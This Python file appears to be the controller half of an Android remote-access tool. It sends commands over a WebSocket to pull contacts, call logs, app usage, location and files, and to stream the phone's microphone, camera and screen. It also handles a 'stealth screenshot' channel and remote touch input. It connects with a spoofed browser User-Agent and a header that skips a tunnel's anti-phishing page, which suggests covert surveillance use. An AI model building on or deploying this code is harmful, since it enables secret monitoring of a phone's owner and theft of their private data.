import websockets
import pyaudio
import os
import asyncio
import json
import time
import base64
import numpy as np
import io
from PIL import Image
from aiortc import RTCPeerConnection, RTCSessionDescription, RTCIceCandidate
from aiortc.sdp import candidate_from_sdp
from aiortc.contrib.media import MediaStreamTrack
import av

# Silence noisy AV logs
import logging
logging.getLogger("aiortc").setLevel(logging.ERROR)
logging.getLogger("libav.swscaler").setLevel(logging.ERROR)
av.logging.set_level(av.logging.FATAL)

class WebRTCHandler:
    def __init__(self, project_id):
        self.ws = None
        self.doc_id = None
        self._reconnect_delay = 1   # Reduced from 2 to 1 for faster recovery
        self._should_run = True
        self.on_disconnected = None
        
        # Audio playback setup
        self.pyaudio_instance = None
        self.audio_stream = None
        self.audio_out_queue = asyncio.Queue()
        self.audio_out_task = None
        
        self.on_connected = None
        self.on_message = None
        self.on_file_saved = None
        self.on_file_info = None
        self.on_thumbnail = None
        self.on_inline_thumbnail = None
        self.on_download_progress = None
        self.on_file_start = None
        self.on_camera_frame = None
        self.on_screenshot = None
        self.on_apps_list = None
        
        self.mic_active = False
        self.current_download = None
        self.current_download_handle = None
        self.current_download_received = 0
        
        if not os.path.exists("downloads"):
            os.makedirs("downloads")
        
        # WebRTC setup
        self.pc = None
        
        # We simulate "readyState" for UI compatibility
        self.data_channel = type('obj', (object,), {'readyState': 'closed', 'send': self._mock_send})()

    def _read_uri(self):
        """Re-read the signaling URL from disk to capture cloud URL changes on-the-fly."""
        try:
            with open("server_url.txt", "r") as f:
                return f.read().strip()
        except FileNotFoundError:
            return "ws://127.0.0.1:8080"

    def send_command(self, cmd_dict):
        """Send generic dictionary command to Android backend"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            coro = self.ws.send(json.dumps(cmd_dict))
            asyncio.run_coroutine_threadsafe(coro, self.loop)

    def _mock_send(self, msg):
        """Simulate the old DataChannel send by sending over WebSocket explicitly as JSON"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            cmd = {}
            if ":" in msg:
                parts = msg.split(":", 1)
                cmd = {"type": parts[0], "path": parts[1]}
            else:
                cmd = {"type": msg}
            
            coro = self.ws.send(json.dumps(cmd))
            asyncio.run_coroutine_threadsafe(coro, self.loop)

    async def start_call(self):
        """Connect directly to the signaling server as the primary transport"""
        self.loop = asyncio.get_running_loop()
        self._should_run = True
        # Start background tasks
        asyncio.create_task(self._playback_worker())
        asyncio.create_task(self._connect_loop())

    def request_usage_stats(self):
        """Request app usage statistics from the device."""
        self._mock_send("request_usage_stats")

    def request_status(self):
        """Request immediate battery/network/device status update."""
        self.send_command({"type": "request_status"})

    def request_apps(self):
        """Request all installed applications from the device."""
        self.send_command({"type": "list_apps"})

    async def _connect_loop(self):
        """Persistent reconnect loop with exponential backoff."""
        while self._should_run:
            try:
                uri = self._read_uri()
                print(f"Connecting to WebSocket at {uri}...")
                headers = {
                    'X-Tunnel-Skip-AntiPhishing-Page': 'true',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                }
                self.ws = await websockets.connect(
                    uri,
                    additional_headers=headers,
                    close_timeout=10,
                    max_size=None,
                )
                self._reconnect_delay = 2  # reset backoff on success

                await self.ws.send(json.dumps({"type": "register", "role": "controller"}))
                
                # Send the local IP to the Android device to allow direct gigabit networking
                import socket
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect(('8.8.8.8', 1))
                    local_ip = s.getsockname()[0]
                    s.close()
                except:
                    local_ip = "127.0.0.1"
                    
                await self.ws.send(json.dumps({"type": "speed_hint", "ip": local_ip}))
                # Removed auto-request_offer to prevent hardware conflicts on phone connect

                # Listen until disconnect
                await self._listen()
            except Exception as e:
                print(f"Connection failed / lost: {e}")

            # ---- Connection is down ----
            self.ws = None
            self.data_channel.readyState = 'closed'
            if self.on_disconnected:
                self.on_disconnected()

            if not self._should_run:
                break

            print(f"Reconnecting in {self._reconnect_delay}s...")
            await asyncio.sleep(self._reconnect_delay)
            self._reconnect_delay = min(self._reconnect_delay * 2, 30)

    async def _listen(self):
        async for message in self.ws:
            if isinstance(message, bytes):
                tag = message[0]
                if tag == 0x01: # Audio From Phone -> PC Speaker
                    # Keep queue short to minimize latency (Max ~1.6s of buffer)
                    while self.audio_out_queue.qsize() > 8:
                        try:
                            self.audio_out_queue.get_nowait()
                        except:
                            break
                    try:
                        self.audio_out_queue.put_nowait(message[1:])
                        # Log reception every 10 chunks to avoid spamming
                        if not hasattr(self, '_chunk_count'): self._chunk_count = 0
                        self._chunk_count += 1
                        if self._chunk_count % 20 == 0:
                            print(f"[DEBUG] Mic Audio: Received chunk {self._chunk_count} (Size: {len(message)-1})")
                    except asyncio.QueueFull:
                        pass # Drop if overloaded
                elif tag == 0x02: # File data
                    self._handle_file_binary(message[1:])
                elif tag == 0x03: # Inline thumbnail data
                    if self.pending_inline_thumb_path and self.on_inline_thumbnail:
                        self.on_inline_thumbnail(self.pending_inline_thumb_path, message[1:])
                        self.pending_inline_thumb_path = None
                elif tag == 0x05: # Native Camera Frame (JPEG)
                    try:
                        img = Image.open(io.BytesIO(message[1:]))
                        # Rotate to portrait (camera sensor is landscape, 90° rotation needed)
                        img = img.rotate(-90, expand=True)
                        if self.on_camera_frame:
                            self.on_camera_frame(img)
                    except Exception as e:
                        print(f"Native Camera error: {e}")
                elif tag == 0x06: # Native Screen Frame (JPEG)
                    try:
                        img = Image.open(io.BytesIO(message[1:]))
                        if self.on_camera_frame:
                            self.on_camera_frame(img)
                    except Exception as e:
                        print(f"Native Screen error: {e}")
                elif tag == 0x07: # Stealth Screenshot (Binary)
                    if self.on_screenshot:
                        self.on_screenshot(message[1:])
            else:
                # JSON text command
                try:
                    data = json.loads(message)
                    self._handle_json(data)
                except json.JSONDecodeError:
                    pass

    def _handle_json(self, data):
        mtype = data.get("type")
        if mtype == "connected":
            print("Device connected!")
            self.data_channel.readyState = "open"
            if self.on_connected:
                self.on_connected()
        elif mtype in ["register", "file_list", "files_list", "error", "file_op_result", "contacts_list", "call_logs_list", "device_status", "app_usage_list", "location_update", "usage_stats", "heartbeat", "apps_list"]:
            if self.on_message:
                self.on_message(json.dumps(data))
            if mtype == "apps_list" and self.on_apps_list:
                self.on_apps_list(data)
        elif mtype == "file_info":
            if self.on_file_info:
                self.on_file_info(data)
        elif mtype == "file_start":
            self.current_download = {"name": data["name"], "size": data["size"]}
            self.current_download_received = 0
            
            # Open file handle
            filename = data["name"]
            path = os.path.join("downloads", filename)
            self.current_download_handle = open(path, "wb")
            
            print(f"Receiving file: {data['name']}")
            if self.on_file_start:
                self.on_file_start(data["name"], data["size"])
        elif mtype == "file_end":
            if self.current_download_handle:
                self.current_download_handle.close()
                self.current_download_handle = None
            if self.current_download:
                path = os.path.join("downloads", self.current_download["name"])
                print(f"File saved to {path}")
                if self.on_file_saved:
                    self.on_file_saved(path)
                self.current_download = None
        elif mtype == "thumbnail_start":
            self.pending_thumbnail = True
            print(f"Receiving thumbnail: {data['name']}")
        elif mtype == "inline_thumbnail":
            self.pending_inline_thumb_path = data.get("path")
        elif mtype == "batch_thumbnails_done":
            pass  # All thumbnails loaded
        elif mtype in ["mic_started", "mic_stopped"]:
            print(f"Device status: {mtype}")
        elif mtype == "webrtc_offer":
            asyncio.create_task(self._handle_webrtc_offer(data))
        elif mtype == "webrtc_candidate":
            asyncio.create_task(self._handle_webrtc_candidate(data))

    async def _handle_webrtc_offer(self, data):
        """Handle incoming WebRTC Offer from Android and return an Answer"""
        print("[WebRTC] Received Offer from Phone")
        
        # Reset PeerConnection for a fresh camera switch (back/front)
        if self.pc:
            print("[WebRTC] Closing existing PeerConnection for camera switch")
            await self.pc.close()
            self.pc = None

        self.pc = RTCPeerConnection()
        
        @self.pc.on("track")
        def on_track(track):
            print(f"[WebRTC] Received video track: {track.kind}")
            if track.kind == "video":
                asyncio.create_task(self._process_video_track(track))
        
        @self.pc.on("icecandidate")
        async def on_icecandidate(candidate):
            if candidate:
                await self.ws.send(json.dumps({
                    "type": "webrtc_candidate",
                    "candidate": {
                        "candidate": candidate.candidate,
                        "sdpMid": candidate.sdpMid,
                        "sdpMLineIndex": candidate.sdpMLineIndex
                    }
                }))

        offer = RTCSessionDescription(sdp=data["sdp"], type="offer")
        await self.pc.setRemoteDescription(offer)
        
        answer = await self.pc.createAnswer()
        await self.pc.setLocalDescription(answer)
        
        await self.ws.send(json.dumps({
            "type": "webrtc_answer",
            "sdp": self.pc.localDescription.sdp,
            "mode": data.get("mode", "camera")
        }))
        print(f"[WebRTC] Sent Answer to Phone (Mode: {data.get('mode', 'camera')})")

    async def _handle_webrtc_candidate(self, data):
        """Handle incoming ICE candidate from Android"""
        if self.pc and data.get("candidate"):
            cand_data = data["candidate"]
            # Some candidates can be empty or indicate end-of-candidates
            if cand_data.get("candidate"):
                try:
                    # Use the utility to parse the candidate string correctly
                    candidate = candidate_from_sdp(cand_data["candidate"])
                    candidate.sdpMid = cand_data.get("sdpMid")
                    candidate.sdpMLineIndex = cand_data.get("sdpMLineIndex")
                    await self.pc.addIceCandidate(candidate)
                except Exception as e:
                    print(f"[WebRTC] Error adding ICE candidate: {e}")
            else:
                # End of candidates signal
                await self.pc.addIceCandidate(None)

    async def _process_video_track(self, track):
        """Process incoming H.264 video frames and send to UI"""
        while True:
            try:
                frame = await track.recv()
                # Convert PyAV frame to PIL Image
                img = frame.to_image()
                
                # Pass the PIL image directly to the UI
                if self.on_camera_frame:
                    self.on_camera_frame(img)
            except Exception as e:
                print(f"[WebRTC] Video track error: {e}")
                break

    def _handle_file_binary(self, raw_bytes):
        """Handle incoming raw file data or thumbnail chunks"""
        # 1. Check if this binary is actually a thumbnail
        if hasattr(self, 'pending_thumbnail') and getattr(self, 'pending_thumbnail', False):
            self.pending_thumbnail = False
            if self.on_thumbnail:
                self.on_thumbnail(raw_bytes)
            return

        # 2. Otherwise it's a file chunk
        if self.current_download_handle:
            self.current_download_handle.write(raw_bytes)
            self.current_download_received += len(raw_bytes)
            
            # Fire progress callback
            if self.on_download_progress and self.current_download:
                total = self.current_download.get("size", 0)
                self.on_download_progress(self.current_download_received, total)

    def _handle_inline_thumb_binary(self, raw_bytes):
        """Handle incoming inline thumbnail binary data"""
        path = self.pending_inline_thumb_path
        self.pending_inline_thumb_path = None
        if path and self.on_inline_thumbnail:
            self.on_inline_thumbnail(path, raw_bytes)

    async def _playback_worker(self):
        """Background task to play audio without blocking the WebSocket listener"""
        print("[Audio] Playback worker started")
        _played = 0
        while self._should_run:
            try:
                raw_pcm = await self.audio_out_queue.get()
                
                # Digital Gain: 3x on PC side (phone already applies 4x = 12x total)
                audio_data = np.frombuffer(raw_pcm, dtype=np.int16).astype(np.float32)
                audio_data = (audio_data * 3.0).clip(-32768, 32767).astype(np.int16)
                boosted_pcm = audio_data.tobytes()
                
                if not self.audio_stream:
                    if not self.pyaudio_instance:
                        self.pyaudio_instance = pyaudio.PyAudio()
                    self.audio_stream = self.pyaudio_instance.open(
                        format=pyaudio.paInt16, channels=1,
                        rate=8000, output=True, frames_per_buffer=2048)
                    print("[Audio] PyAudio output stream opened (8kHz mono)")
                
                # Run blocking write in thread executor to avoid stalling the event loop
                loop = asyncio.get_event_loop()
                await loop.run_in_executor(None, lambda: self.audio_stream.write(boosted_pcm, exception_on_underflow=False))
                _played += 1
                if _played % 50 == 0:
                    print(f"[Audio] Played {_played} chunks ({len(boosted_pcm)} bytes each)")
                self.audio_out_queue.task_done()
            except Exception as e:
                print(f"Playback worker error: {e}")
                import traceback
                traceback.print_exc()
                await asyncio.sleep(0.1)

    def _play_audio(self, raw_pcm):
        """Deprecated: Logic moved to _playback_worker"""
        pass

    def start_pc_mic(self):
        # Start capturing PC microphone using PyAudio callback and send it to WebSocket
        print("[DEBUG] webrtc: start_pc_mic() called")
        if getattr(self, 'pc_mic_stream', None):
            return True
            
        try:
            if not getattr(self, 'pyaudio_instance', None):
                self.pyaudio_instance = pyaudio.PyAudio()
                
            def _callback(in_data, frame_count, time_info, status):
                try:
                    if in_data and getattr(self, 'ws', None) and getattr(self, 'loop', None):
                        # Boost volume digitally (Digital Gain 4x)
                        audio_data = np.frombuffer(in_data, dtype=np.int16).astype(np.float32)
                        audio_data = (audio_data * 4.0).clip(-32768, 32767).astype(np.int16)
                        boosted_data = audio_data.tobytes()
                        
                        # Use raw binary for PC -> Phone audio for efficiency (Tag 0x04)
                        tagged = b'\x04' + boosted_data
                        asyncio.run_coroutine_threadsafe(self.ws.send(tagged), self.loop)
                except:
                    pass # Silently drop frames on network error
                return (in_data, pyaudio.paContinue)
                
            self.pc_mic_stream = self.pyaudio_instance.open(
                format=pyaudio.paInt16,
                channels=1,
                rate=8000,
                input=True,
                frames_per_buffer=1024,
                stream_callback=_callback
            )
            self.pc_mic_stream.start_stream()
            # Tell the phone to activate its speaker for incoming audio
            if getattr(self, 'ws', None) and getattr(self, 'loop', None):
                asyncio.run_coroutine_threadsafe(
                    self.ws.send(json.dumps({"type": "start_speaker"})), self.loop
                )
            return True
        except Exception as e:
            print(f"Failed to start PC mic: {e}")
            return False

    def stop_pc_mic(self):
        """Stop capturing PC microphone"""
        # Tell the phone to deactivate its speaker
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            try:
                asyncio.run_coroutine_threadsafe(
                    self.ws.send(json.dumps({"type": "stop_speaker"})), self.loop
                )
            except: pass
        try:
            if getattr(self, 'pc_mic_stream', None):
                self.pc_mic_stream.stop_stream()
                self.pc_mic_stream.close()
                self.pc_mic_stream = None
        except Exception:
            pass
        return False
        
    def start_mic(self):
        """Send JSON request to start phone microphone"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "start_mic"})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def stop_mic(self):
        """Send JSON request to stop phone microphone and clean up audio"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "stop_mic"})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)
        # Flush audio queue and close stream immediately
        try:
            while not self.audio_out_queue.empty():
                try: self.audio_out_queue.get_nowait()
                except: break
            if self.audio_stream:
                self.audio_stream.stop_stream()
                self.audio_stream.close()
                self.audio_stream = None
                print("[Audio] Playback stopped")
        except Exception as e:
            print(f"[Audio] Stop error: {e}")

    def start_camera(self, lens="back"):
        """Send JSON request to start phone camera"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "start_camera", "lens": lens})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def take_photo(self, lens="back"):
        """Send JSON request to take a single high-res photo"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "take_photo", "lens": lens})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def stop_camera(self):
        """Send JSON request to stop phone camera"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "stop_camera"})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def start_screen(self):
        """Send JSON request to start phone screen capture"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "start_screen"})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def stop_screen(self):
        """Send JSON request to stop phone screen capture"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "stop_screen"})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def request_contacts(self):
        """Send JSON request to get phone contacts"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "get_contacts"})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def request_call_logs(self):
        """Send JSON request to get phone call logs"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "get_call_logs"})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def request_usage_stats(self):
        """Send JSON request to get app usage stats"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "get_usage_stats"})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def stop_camera(self):
        """Send JSON request to stop phone camera"""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "stop_camera"})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def start_screen(self):
        """Request the device to start screen sharing via WebRTC."""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "start_screen"})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def stop_screen(self):
        """Request the device to stop screen sharing."""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            payload = json.dumps({"type": "stop_screen"})
            asyncio.run_coroutine_threadsafe(self.ws.send(payload), self.loop)

    def send_touch_event(self, action, x, y, x2=0, y2=0, duration=300, nav_action=None):
        """Send a touch/gesture event to the device."""
        if getattr(self, 'ws', None) and getattr(self, 'loop', None):
            msg = {
                "type": "remote_touch",
                "action": action,
                "x": x,
                "y": y,
                "x1": x, # Compatibility field
                "y1": y, # Compatibility field
                "x2": x2,
                "y2": y2,
                "duration": duration,
                "navAction": nav_action
            }
            asyncio.run_coroutine_threadsafe(self.ws.send(json.dumps(msg)), self.loop)

    async def close(self):
        self._should_run = False
        if self.ws:
            await self.ws.close()
        try:
            if self.audio_stream:
                self.audio_stream.stop_stream()
                self.audio_stream.close()
            if self.pyaudio_instance:
                self.pyaudio_instance.terminate()
        except:
            pass
